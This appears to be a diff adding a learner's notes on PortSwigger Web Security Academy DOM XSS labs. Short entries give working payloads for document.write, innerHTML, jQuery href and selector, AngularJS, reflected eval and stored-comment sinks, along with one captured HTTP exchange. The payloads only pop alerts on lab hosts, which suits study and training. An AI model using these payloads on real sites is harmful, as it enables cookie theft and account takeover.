@@ -52,3 +52,110 @@ document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">'
 
 document.write('<img src="/resources/images/tracker.gif?searchTerms='+"><svg onload=alert(test)>+'">');
 
+4) Lab: DOM XSS in document.write sink using source location.search inside a select element
+
+var store = (new URLSearchParams(window.location.search)).get('storeId');
+
+->
+
+Add parameter "storeId" to query
+
+->
+
+https://0a0d00c2047f08bb82231a800029002e.web-security-academy.net/product?productId=1&storeId=%3Cscript%3Ealert(%27test!%27)%3C/script%3E
+
+5) Lab: DOM XSS in innerHTML sink using source location.search
+
+Enter into search
+
+->
+
+<img src=1 onerror=alert(document.domain)>
+
+6) Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
+
+javascript:alert(document.cookie)
+
+->
+
+https://0a96007d03d06a2f82f779560064005c.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
+
+7) Lab: DOM XSS in jQuery selector sink using a hashchange event
+
+<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+
+---
+
+https://0a28001d037761888032039a00030040.web-security-academy.net/#Finding%20Inspiration
+
+---
+
+<iframe src="https://0a28001d037761888032039a00030040.web-security-academy.net/#Finding%20Inspiration" onload="this.src+='<img src=1 onerror=alert(document.cookie)>'">
+
+---
+
+Add to body created script and send this from exploit server
+
+8) Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+
+{{$on.constructor('alert(1)')()}}
+
+9) Lab: Reflected DOM XSS
+
+GET /resources/js/searchResults.js
+
+---
+
+eval('var searchResultsObj = ' + this.responseText);
+
+---
+
+\"-alert(1)}//
+
+---
+
+{"searchTerm":"\\"-alert(1)}//", "results":[]}
+
+---
+
+GET /search-results?search=%5C%22-alert%281%29%7D%2F%2F HTTP/2
+Host: 0af6006e0332d86d827b84fc0006002d.web-security-academy.net
+Cookie: session=YzfRinectuzc27eEovQFjwH7nn7qEFSO
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0af6006e0332d86d827b84fc0006002d.web-security-academy.net/?search=%5C%22-alert%281%29%7D%2F%2F
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+->
+
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 45
+
+{"results":[],"searchTerm":"\\"-alert(1)}//"}
+
+10) Lab: Stored DOM XSS
+
+return html.replace('<', '&lt;').replace('>', '&gt;');
+
+---
+
+Replaces only first < and >
+
+---
+
+Enter into comment
+
+->
+
+<><img src=1 onerror=alert(1)>
+
